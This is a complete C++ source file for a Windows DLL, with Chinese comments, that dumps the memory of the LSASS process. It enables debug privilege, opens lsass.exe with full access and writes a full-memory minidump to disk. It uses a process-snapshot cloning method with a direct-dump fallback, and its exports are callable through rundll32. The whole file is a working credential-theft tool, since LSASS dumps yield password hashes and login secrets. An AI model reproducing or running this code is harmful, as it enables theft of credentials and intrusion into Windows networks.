#include "pch.h"
#include <windows.h>
#include <DbgHelp.h>
#include <iostream>
#include <TlHelp32.h>
#include <processsnapshot.h>
#include <string>
#include <sstream>

#pragma comment (lib, "Dbghelp.lib")

// 全局变量用于存储输出信息
std::wstring g_output;

// 输出日志函数
void Log(const std::wstring& message)
{
    g_output += message + L"\n";
    // 不再用 OutputDebugStringW
}

// MiniDump 回调函数
BOOL CALLBACK MyMiniDumpWriteDumpCallback(
    __in     PVOID CallbackParam,
    __in     const PMINIDUMP_CALLBACK_INPUT CallbackInput,
    __inout  PMINIDUMP_CALLBACK_OUTPUT CallbackOutput
)
{
    switch (CallbackInput->CallbackType)
    {
    case 16: // IsProcessSnapshotCallback
        CallbackOutput->Status = S_FALSE;
        break;
    }
    return TRUE;
}

// 启用调试权限
BOOL EnableDebugPrivilege()
{
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    Log(L"[*] 尝试提升调试权限...");
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        Log(L"[-] OpenProcessToken 失败: " + std::to_wstring(GetLastError()));
        return FALSE;
    }

    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
    {
        Log(L"[-] LookupPrivilegeValue 失败: " + std::to_wstring(GetLastError()));
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
    {
        Log(L"[-] AdjustTokenPrivileges 失败: " + std::to_wstring(GetLastError()));
        CloseHandle(hToken);
        return FALSE;
    }

    CloseHandle(hToken);
    Log(L"[+] 成功提升调试权限");
    return TRUE;
}

// 核心 dump 函数
BOOL DumpLsass(LPCWSTR outputPath = NULL)
{
    Log(L"[*] 开始 LSASS dump 流程...");

    // 启用权限
    if (!EnableDebugPrivilege())
    {
        Log(L"[-] 无法提升调试权限");
        return FALSE;
    }

    // 查找 lsass.exe
    DWORD lsassPID = 0;
    Log(L"[*] 创建进程快照...");
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE)
    {
        Log(L"[-] 创建进程快照失败: " + std::to_wstring(GetLastError()));
        return FALSE;
    }

    PROCESSENTRY32W processEntry = {};
    processEntry.dwSize = sizeof(PROCESSENTRY32W);

    BOOL foundLsass = FALSE;
    if (Process32FirstW(snapshot, &processEntry))
    {
        do
        {
            std::wstringstream ss;
            ss << L"[*] 检查进程: " << processEntry.szExeFile << L" (PID: " << processEntry.th32ProcessID << L")";
            Log(ss.str());

            if (_wcsicmp(processEntry.szExeFile, L"lsass.exe") == 0)
            {
                lsassPID = processEntry.th32ProcessID;
                foundLsass = TRUE;
                std::wstringstream ss2;
                ss2 << L"[+] 找到 lsass.exe, PID: " << lsassPID;
                Log(ss2.str());
                break;
            }
        } while (Process32NextW(snapshot, &processEntry));
    }

    CloseHandle(snapshot);

    if (!foundLsass)
    {
        Log(L"[-] 未找到 lsass.exe 进程");
        return FALSE;
    }

    // 打开 lsass 进程
    Log(L"[*] 打开 lsass.exe 进程, PID: " + std::to_wstring(lsassPID));
    HANDLE lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsassPID);
    if (lsassHandle == NULL)
    {
        std::wstringstream ss;
        ss << L"[-] 打开 lsass.exe 失败, 错误码: " << GetLastError();
        Log(ss.str());
        return FALSE;
    }
    Log(L"[+] 打开 lsass.exe 成功");

    // 确定输出文件路径
    std::wstring dumpPath;
    if (outputPath != NULL && wcslen(outputPath) > 0)
    {
        dumpPath = outputPath;
    }
    else
    {
        wchar_t tempPath[MAX_PATH];
        GetTempPathW(MAX_PATH, tempPath);
        dumpPath = std::wstring(tempPath) + L"lsass_" + std::to_wstring(GetTickCount()) + L".dmp";
    }
    Log(L"[*] Dump 文件路径: " + dumpPath);

    // 创建输出文件
    Log(L"[*] 创建 dump 文件...");
    HANDLE outFile = CreateFileW(dumpPath.c_str(), GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (outFile == INVALID_HANDLE_VALUE)
    {
        Log(L"[-] 创建 dump 文件失败: " + std::to_wstring(GetLastError()));
        CloseHandle(lsassHandle);
        return FALSE;
    }
    Log(L"[+] 创建 dump 文件成功");

    Log(L"[*] 尝试 dump LSASS...");

    // 尝试方法1：使用 PssCaptureSnapshot
    HPSS snapshotHandle = NULL;
    DWORD flags = PSS_CAPTURE_VA_CLONE | PSS_CAPTURE_HANDLES |
        PSS_CAPTURE_HANDLE_NAME_INFORMATION | PSS_CAPTURE_HANDLE_BASIC_INFORMATION |
        PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION | PSS_CAPTURE_HANDLE_TRACE |
        PSS_CAPTURE_THREADS | PSS_CAPTURE_THREAD_CONTEXT | PSS_CAPTURE_THREAD_CONTEXT_EXTENDED |
        PSS_CREATE_BREAKAWAY | PSS_CREATE_BREAKAWAY_OPTIONAL |
        PSS_CREATE_USE_VM_ALLOCATIONS | PSS_CREATE_RELEASE_SECTION;

    BOOL dumpSuccess = FALSE;
    Log(L"[*] 调用 PssCaptureSnapshot...");
    DWORD result = PssCaptureSnapshot(lsassHandle, (PSS_CAPTURE_FLAGS)flags, CONTEXT_ALL, &snapshotHandle);

    if (result == ERROR_SUCCESS)
    {
        Log(L"[+] PssCaptureSnapshot 成功");
        MINIDUMP_CALLBACK_INFORMATION CallbackInfo;
        ZeroMemory(&CallbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
        CallbackInfo.CallbackRoutine = &MyMiniDumpWriteDumpCallback;
        CallbackInfo.CallbackParam = NULL;

        Log(L"[*] 调用 MiniDumpWriteDump (snapshot) ...");
        dumpSuccess = MiniDumpWriteDump(snapshotHandle, lsassPID, outFile, MiniDumpWithFullMemory, NULL, NULL, &CallbackInfo);
        if (dumpSuccess)
            Log(L"[+] MiniDumpWriteDump (snapshot) 成功");
        else
            Log(L"[-] MiniDumpWriteDump (snapshot) 失败: " + std::to_wstring(GetLastError()));

        PssFreeSnapshot(GetCurrentProcess(), snapshotHandle);
    }
    else
    {
        Log(L"[-] PssCaptureSnapshot 失败, 错误码: " + std::to_wstring(result));
        Log(L"[*] 尝试直接 MiniDumpWriteDump ...");
        dumpSuccess = MiniDumpWriteDump(lsassHandle, lsassPID, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
        if (dumpSuccess)
            Log(L"[+] MiniDumpWriteDump (direct) 成功");
        else
            Log(L"[-] MiniDumpWriteDump (direct) 失败: " + std::to_wstring(GetLastError()));
    }

    if (dumpSuccess)
    {
        Log(L"[+] LSASS dump 成功!");
        Log(L"[+] Dump 文件: " + dumpPath);
    }
    else
    {
        Log(L"[-] dump 失败");
    }

    // 清理资源
    CloseHandle(outFile);
    CloseHandle(lsassHandle);

    return dumpSuccess;
}

// 导出函数1：供 rundll32 调用
extern "C" __declspec(dllexport) void CALLBACK DumpLsassW(HWND hwnd, HINSTANCE hinst, LPWSTR lpszCmdLine, int nCmdShow)
{
    g_output.clear();
    Log(L"[*] 进入 DumpLsassW");
    std::wstring outputPath;
    if (lpszCmdLine && wcslen(lpszCmdLine) > 0)
    {
        outputPath = lpszCmdLine;
        Log(L"[*] 命令行参数输出路径: " + outputPath);
    }

    BOOL success = DumpLsass(outputPath.empty() ? NULL : outputPath.c_str());

    // 始终弹窗显示日志
    MessageBoxW(hwnd, g_output.c_str(), L"LSASS Dump Result", success ? MB_OK : MB_OK | MB_ICONERROR);
}

// 导出函数2：供 rundll32 调用（ANSI版本）
extern "C" __declspec(dllexport) void CALLBACK DumpLsassA(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
    g_output.clear();
    Log(L"[*] 进入 DumpLsassA");
    std::wstring outputPath;
    if (lpszCmdLine && strlen(lpszCmdLine) > 0)
    {
        int len = MultiByteToWideChar(CP_ACP, 0, lpszCmdLine, -1, NULL, 0);
        if (len > 0)
        {
            outputPath.resize(len);
            MultiByteToWideChar(CP_ACP, 0, lpszCmdLine, -1, &outputPath[0], len);
        }
        Log(L"[*] 命令行参数输出路径: " + outputPath);
    }

    DumpLsassW(hwnd, hinst, outputPath.empty() ? NULL : &outputPath[0], nCmdShow);
    // DumpLsassW 已经弹窗
}

// 导出函数3：供编程调用
extern "C" __declspec(dllexport) BOOL DumpLsassToFile(LPCWSTR outputPath)
{
    g_output.clear();
    Log(L"[*] 进入 DumpLsassToFile");
    BOOL result = DumpLsass(outputPath);
    MessageBoxW(NULL, g_output.c_str(), L"LSASS Dump Result", result ? MB_OK : MB_OK | MB_ICONERROR);
    return result;
}

// 导出函数4：无参数版本
extern "C" __declspec(dllexport) BOOL DumpLsassDefault()
{
    g_output.clear();
    Log(L"[*] 进入 DumpLsassDefault");
    BOOL result = DumpLsass(NULL);
    MessageBoxW(NULL, g_output.c_str(), L"LSASS Dump Result", result ? MB_OK : MB_OK | MB_ICONERROR);
    return result;
}

// DLL 入口点
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}